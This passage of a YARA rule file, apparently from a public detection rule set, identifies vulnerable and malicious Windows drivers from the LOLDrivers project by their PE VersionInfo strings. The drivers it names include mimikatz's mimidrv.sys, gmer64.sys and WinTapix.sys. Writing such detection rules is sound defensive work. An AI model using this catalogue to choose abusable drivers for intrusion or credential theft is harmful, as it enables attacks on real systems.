   score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f00770073002000780036003400200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200031002c00200031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003800200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_8137_RID3BA8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:38:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200031002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003700200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Asmediatechnologyinc_Asmiosys_Asmediapcidriver_E465_RID40C4 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AsmIo64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:16:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410073006d006500640069006100200050004300490020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410073006d006500640069006100200054006500630068006e006f006c006f00670079002000200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0031002e00300030003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0031002e0030003000300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00410073006d0049006f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410073006d006500640069006100200050004300490020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00410073006d0049006f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a9002000410073006d006500640069006100200054006500630068006e006f006c006f00670079002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_4DA0_RID3EC9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:52:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0037002e0034003000310036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0037002e0034003000310036002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003800200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule MAL_Driver_Microsoftcorporation_Windbgsys_Microsoftwindowsoperatingsystem_6994_RID465D : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - windbg.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:15:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570069006e0064006f007700730020004700550049002000730079006d0062006f006c00690063002000640065006200750067006700650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e00310039003000340031002e0036003800350020002800570069006e004200750069006c0064002e003100360030003100300031002e00300038003000300029 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e00310039003000340031002e003600380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00770069006e006400620067002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f00660074003f002000570069006e0064006f00770073003f0020004f007000650072006100740069006e0067002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00770069006e006400620067002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]003f0020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_AAF0_RID3FB9 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:32:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000320030002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_DDF4_RID3FC3 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:33:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0031002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0031002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310036002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_0F58_RID3FA4 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:28:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310034002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_7662_RID3F96 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:26:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0031002e0031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0031002e0031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310037002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_14B8_RID3FA0 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:27:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0031002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0031002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310037002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_41AD_RID3FAB : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:29:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310039002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Sensecorp_42B2_RID3000 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Sense5Ext.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 12:21:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530065006e0073006500350020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00530065006e00730065003500200043004f00520050 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0035002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0035002e0030002e0030 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320032 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Legalcorp_Pciexpressvideocapture_FD22_RID398B : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - PcieCubed.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 19:08:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005000430049006500200056006900640065006f00200043006100700074007500720065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004c006500670061006c00200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e00310035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e00310035 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0050004300490020004500780070007200650073007300200056006900640065006f00200043006100700074007500720065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005000630069006500430075006200650064002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00320030003100360020004c006500670061006c } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Gmer_Gmersys_Gmer_0052_RID32F9 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - gmer64.sys, superman.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:28:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004d00450052002000440072006900760065007200200068007400740070003a002f002f007700770077002e0067006d00650072002e006e00650074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047004d00450052 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002c00200030002c002000360039003800330020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002c00200030002c00200036003900380033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0067006d0065007200360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0047004d00450052 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0067006d0065007200360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200047004d0045005200200032003000300033002d0032003000310033 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Mimidrv_Mimidrvmimikatz_2FAF_RID35E8 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 16:33:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310035002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Gentilkiwibenjamindelpy_Mimidrv_Mimidrvmimikatz_2FD4_RID3FB1 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:30:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006d0069006d006900640072007600200066006f0072002000570069006e0064006f0077007300200028006d0069006d0069006b00610074007a0029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0069006d0069006400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]006d0069006d006900640072007600200028006d0069006d0069006b00610074007a0029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d0069006d0069006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310035002000670065006e00740069006c006b0069007700690020002800420065006e006a0061006d0069006e002000440045004c005000590029 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Microsoftcorporation_Ntbiosys_Microsoftrwindowsrntoperatingsystem_C0D8_RID47D7 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ntbios_2.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:18:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]006e007400620069006f00730020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002c00200030002c00200032002c00200031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002c00200030002c00200032002c00200031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e007400620069006f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0020004d006900630072006f0073006f00660074002800520029002000570069006e0064006f0077007300200028005200290020004e00540020004f007000650072006100740069006e0067002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e007400620069006f0073002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000300033 } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Microsoftcorporation_Wintapixsys_Microsoftwindowsoperatingsystem_8578_RID4756 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - WinTapix.sys, SRVNET2.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:56:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570069006e0064006f007700730020004b00650072006e0065006c00200045007800650063007500740069007600650020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0033002e0039003600300030002e003100360033003800340020002800770069006e0062006c00750065005f00720074006d002e003100330030003800320031002d00310036003200330029 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0033002e0039003600300030002e00310036003300380034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00570069006e00540061007000690078002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f0066007400ae002000570069006e0064006f0077007300ae0020004f007000650072006100740069006e0067002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00570069006e00540061007000690078002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      all of them\n}\n\nrule MAL_Driver_Microsoftcorporation_Wantdsys_Microsoftwindowsoperatingsystem_E7AF_RID4627 : DEMO MAL {\n   meta:\n      description = \"Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - wantd_6.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:06:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 